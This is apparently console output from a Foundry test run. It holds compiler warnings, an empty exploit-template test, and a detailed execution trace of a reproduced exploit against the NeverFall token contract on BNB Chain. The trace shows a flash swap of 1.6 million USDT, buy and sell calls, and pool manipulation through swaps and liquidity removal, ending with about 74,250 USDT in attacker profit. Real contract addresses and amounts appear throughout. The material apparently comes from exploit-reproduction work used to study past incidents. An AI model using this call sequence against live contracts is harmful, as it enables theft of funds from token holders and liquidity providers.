Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.19s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 261.47ms (205.03µs CPU time)

Ran 1 test for src/test/2023-05/NeverFall_exp.sol:ContractTest
[PASS] testExploit() (gas: 529483)
Logs:
  [After Attacks]  Attacker usdt balance: 74250.894511677726514604

Traces:
  [588883] ContractTest::testExploit()
    ├─ [583249] 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00::swap(1600000000000000000000000 [1.6e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [12871] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1600000000000000000000000 [1.6e24])
    │   │   ├─ emit Transfer(from: 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1600000000000000000000000 [1.6e24])
    │   │   └─ ← [Return] true
    │   ├─ [536945] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1600000000000000000000000 [1.6e24], 0, 0x00)
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 1600000010000000000000000 [1.6e24]
    │   │   ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [282269] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::buy(200000000000000000000000 [2e23])
    │   │   │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 200000000000000000000000 [2e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, value: 200000000000000000000000 [2e23])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, value: 115792089237316195423570985008687907853269984665640563839457584007913129639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [7462] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 200000000000000000000000 [2e23])
    │   │   │   │   ├─ emit Approval(owner: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 200000000000000000000000 [2e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [133358] 0x10ED43C718714eb63d5aA57B78B54704E256024E::addLiquidity(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x55d398326f99059fF775485246999027B3197955, 99900000000000000000000000000 [9.99e28], 184000000000000000000000 [1.84e23], 1, 184000000000000000000000 [1.84e23], 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 1683045919 [1.683e9])
    │   │   │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x55d398326f99059fF775485246999027B3197955) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c
    │   │   │   │   ├─ [2893] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 390749131999675869539950 [3.907e23], 177366502266430132318230923 [1.773e26], 1683045649 [1.683e9]
    │   │   │   │   ├─ [22682] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::transferFrom(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 83520176359726925202079336 [8.352e25])
    │   │   │   │   │   ├─ emit Transfer(from: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, to: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, value: 83520176359726925202079336 [8.352e25])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 184000000000000000000000 [1.84e23])
    │   │   │   │   │   ├─ emit Transfer(from: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, to: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, value: 184000000000000000000000 [1.84e23])
    │   │   │   │   │   ├─ emit Approval(owner: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 16000000000000000000000 [1.6e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [82236] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::mint(0x5ABDe8B434133C98c36F4B21476791D95D888bF5)
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 574749131999675869539950 [5.747e23]
    │   │   │   │   │   ├─ [608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 260886678626157057520310259 [2.608e26]
    │   │   │   │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 170370208048680676 [1.703e17])
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, value: 3918514659767012722445607 [3.918e24])
    │   │   │   │   │   ├─ emit Sync(reserve0: 574749131999675869539950 [5.747e23], reserve1: 260886678626157057520310259 [2.608e26])
    │   │   │   │   │   ├─ emit Mint(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 184000000000000000000000 [1.84e23], amount1: 83520176359726925202079336 [8.352e25])
    │   │   │   │   │   └─ ← [Return] 3918514659767012722445607 [3.918e24]
    │   │   │   │   └─ ← [Return] 83520176359726925202079336 [8.352e25], 184000000000000000000000 [1.84e23], 3918514659767012722445607 [3.918e24]
    │   │   │   ├─ [63655] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(8000000000000000000000 [8e21], 0, [0x55d398326f99059fF775485246999027B3197955, 0x5ABDe8B434133C98c36F4B21476791D95D888bF5], 0xE5aaa64f7CE48027457E661258113650D584DFee, 1683045919 [1.683e9])
    │   │   │   │   ├─ [6034] 0x55d398326f99059fF775485246999027B3197955::transferFrom(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 8000000000000000000000 [8e21])
    │   │   │   │   │   ├─ emit Transfer(from: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, to: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, value: 8000000000000000000000 [8e21])
    │   │   │   │   │   ├─ emit Approval(owner: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 8000000000000000000000 [8e21])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [2608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0xE5aaa64f7CE48027457E661258113650D584DFee) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   ├─ [893] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 574749131999675869539950 [5.747e23], 260886678626157057520310259 [2.608e26], 1683045919 [1.683e9]
    │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 582749131999675869539950 [5.827e23]
    │   │   │   │   ├─ [45839] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::swap(0, 3572630200059899042909716 [3.572e24], 0xE5aaa64f7CE48027457E661258113650D584DFee, 0x)
    │   │   │   │   │   ├─ [30672] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::transfer(0xE5aaa64f7CE48027457E661258113650D584DFee, 3572630200059899042909716 [3.572e24])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, to: 0xE5aaa64f7CE48027457E661258113650D584DFee, value: 3572630200059899042909716 [3.572e24])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 582749131999675869539950 [5.827e23]
    │   │   │   │   │   ├─ [608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 257314048426097158477400543 [2.573e26]
    │   │   │   │   │   ├─ emit Sync(reserve0: 582749131999675869539950 [5.827e23], reserve1: 257314048426097158477400543 [2.573e26])
    │   │   │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 8000000000000000000000 [8e21], amount1In: 0, amount0Out: 0, amount1Out: 3572630200059899042909716 [3.572e24], to: 0xE5aaa64f7CE48027457E661258113650D584DFee)
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0xE5aaa64f7CE48027457E661258113650D584DFee) [staticcall]
    │   │   │   │   │   └─ ← [Return] 3572630200059899042909716 [3.572e24]
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 79947546159667026159169620 [7.994e25])
    │   │   │   ├─ emit Transfer(from: 0xE5aaa64f7CE48027457E661258113650D584DFee, to: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, value: 3572630200059899042909716 [3.572e24])
    │   │   │   ├─ [8071] 0x55d398326f99059fF775485246999027B3197955::transfer(0x712f6993F8E1A3DE6ACF2f4adF8Ab102748edc88, 8000000000000000000000 [8e21])
    │   │   │   │   ├─ emit Transfer(from: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, to: 0x712f6993F8E1A3DE6ACF2f4adF8Ab102748edc88, value: 8000000000000000000000 [8e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit BuyNF(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 200000000000000000000000 [2e23])
    │   │   │   └─ ← [Return] 83520176359726925202079336 [8.352e25]
    │   │   ├─ [2562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [61655] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(1400000000000000000000000 [1.4e24], 0, [0x55d398326f99059fF775485246999027B3197955, 0x5ABDe8B434133C98c36F4B21476791D95D888bF5], 0x051d6a5f987e4fc53B458eC4f88A104356E6995a, 1683045919 [1.683e9])
    │   │   │   ├─ [6034] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 1400000000000000000000000 [1.4e24])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, value: 1400000000000000000000000 [1.4e24])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640562639457584007913129639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0x051d6a5f987e4fc53B458eC4f88A104356E6995a) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [893] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 582749131999675869539950 [5.827e23], 257314048426097158477400543 [2.573e26], 1683045919 [1.683e9]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   └─ ← [Return] 1982749131999675869539950 [1.982e24]
    │   │   │   ├─ [43839] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::swap(0, 181553227846560717220996778 [1.815e26], 0x051d6a5f987e4fc53B458eC4f88A104356E6995a, 0x)
    │   │   │   │   ├─ [28672] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::transfer(0x051d6a5f987e4fc53B458eC4f88A104356E6995a, 181553227846560717220996778 [1.815e26])
    │   │   │   │   │   ├─ emit Transfer(from: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, to: 0x051d6a5f987e4fc53B458eC4f88A104356E6995a, value: 181553227846560717220996778 [1.815e26])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1982749131999675869539950 [1.982e24]
    │   │   │   │   ├─ [608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   └─ ← [Return] 75760820579536441256403765 [7.576e25]
    │   │   │   │   ├─ emit Sync(reserve0: 1982749131999675869539950 [1.982e24], reserve1: 75760820579536441256403765 [7.576e25])
    │   │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 1400000000000000000000000 [1.4e24], amount1In: 0, amount0Out: 0, amount1Out: 181553227846560717220996778 [1.815e26], to: 0x051d6a5f987e4fc53B458eC4f88A104356E6995a)
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0x051d6a5f987e4fc53B458eC4f88A104356E6995a) [staticcall]
    │   │   │   │   └─ ← [Return] 181553227846560717220996778 [1.815e26]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [115354] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::sell(75500000000000000000000000 [7.55e25])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, value: 75500000000000000000000000 [7.55e25])
    │   │   │   ├─ [608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   └─ ← [Return] 75760820579536441256403765 [7.576e25]
    │   │   │   ├─ [439] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 12240015757766824861408624 [1.224e25]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x5ABDe8B434133C98c36F4B21476791D95D888bF5) [staticcall]
    │   │   │   │   └─ ← [Return] 10920 [1.092e4]
    │   │   │   ├─ [85360] 0x10ED43C718714eb63d5aA57B78B54704E256024E::removeLiquidity(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x55d398326f99059fF775485246999027B3197955, 12197877248982797510354403 [1.219e25], 67950000000000000000000000 [6.795e25], 0, 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 1683045919 [1.683e9])
    │   │   │   │   ├─ [27476] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::transferFrom(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, 12197877248982797510354403 [1.219e25])
    │   │   │   │   │   ├─ emit Transfer(from: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, to: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, value: 12197877248982797510354403 [1.219e25])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [55497] 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c::burn(0x5ABDe8B434133C98c36F4B21476791D95D888bF5)
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1982749131999675869539950 [1.982e24]
    │   │   │   │   │   ├─ [608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 75760820579536441256403765 [7.576e25]
    │   │   │   │   │   ├─ [354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 3526719319218903323292 [3.526e21])
    │   │   │   │   │   ├─ emit Transfer(from: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, to: 0x0000000000000000000000000000000000000000, value: 12197877248982797510354403 [1.219e25])
    │   │   │   │   │   ├─ [6071] 0x55d398326f99059fF775485246999027B3197955::transfer(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 1975353993578444384134829 [1.975e24])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, to: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, value: 1975353993578444384134829 [1.975e24])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [4772] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::transfer(0x5ABDe8B434133C98c36F4B21476791D95D888bF5, 75478252429058064682693305 [7.547e25])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c, to: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, value: 75478252429058064682693305 [7.547e25])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 7395138421231485405121 [7.395e21]
    │   │   │   │   │   ├─ [608] 0x5ABDe8B434133C98c36F4B21476791D95D888bF5::balanceOf(0x97a08A9Fb303b4f6F26C5B3C3002EBd0E6417d2c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 282568150478376573710460 [2.825e23]
    │   │   │   │   │   ├─ emit Sync(reserve0: 7395138421231485405121 [7.395e21], reserve1: 282568150478376573710460 [2.825e23])
    │   │   │   │   │   ├─ emit Burn(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 1975353993578444384134829 [1.975e24], amount1: 75478252429058064682693305 [7.547e25], to: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5)
    │   │   │   │   │   └─ ← [Return] 1975353993578444384134829 [1.975e24], 75478252429058064682693305 [7.547e25]
    │   │   │   │   └─ ← [Return] 75478252429058064682693305 [7.547e25], 1975353993578444384134829 [1.975e24]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x5ABDe8B434133C98c36F4B21476791D95D888bF5) [staticcall]
    │   │   │   │   └─ ← [Return] 1975353993578444384145749 [1.975e24]
    │   │   │   ├─ [6071] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1679050894541677726514604 [1.679e24])
    │   │   │   │   ├─ emit Transfer(from: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1679050894541677726514604 [1.679e24])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x712f6993F8E1A3DE6ACF2f4adF8Ab102748edc88, 296303099036766657620224 [2.963e23])
    │   │   │   │   ├─ emit Transfer(from: 0x5ABDe8B434133C98c36F4B21476791D95D888bF5, to: 0x712f6993F8E1A3DE6ACF2f4adF8Ab102748edc88, value: 296303099036766657620224 [2.963e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit SellNF(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 75500000000000000000000000 [7.55e25], param2: 1975353993578444384134829 [1.975e24])
    │   │   │   └─ ← [Return] 1679050894541677726514604 [1.679e24]
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, 1604800010030000000000000 [1.604e24])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00, value: 1604800010030000000000000 [1.604e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 74250894511677726514604 [7.425e22]
    │   │   ├─ emit log_named_decimal_uint(key: "[After Attacks]  Attacker usdt balance", val: 74250894511677726514604 [7.425e22], decimals: 18)
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00) [staticcall]
    │   │   └─ ← [Return] 74958965123222575972654468 [7.495e25]
    │   ├─ [2531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00) [staticcall]
    │   │   └─ ← [Return] 74784099932425533361543436 [7.478e25]
    │   ├─ emit Sync(reserve0: 74958965123222575972654468 [7.495e25], reserve1: 74784099932425533361543436 [7.478e25])
    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 1604800010030000000000000 [1.604e24], amount1In: 0, amount0Out: 1600000000000000000000000 [1.6e24], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 323.79ms (3.11ms CPU time)

Ran 2 test suites in 325.23ms (585.26ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
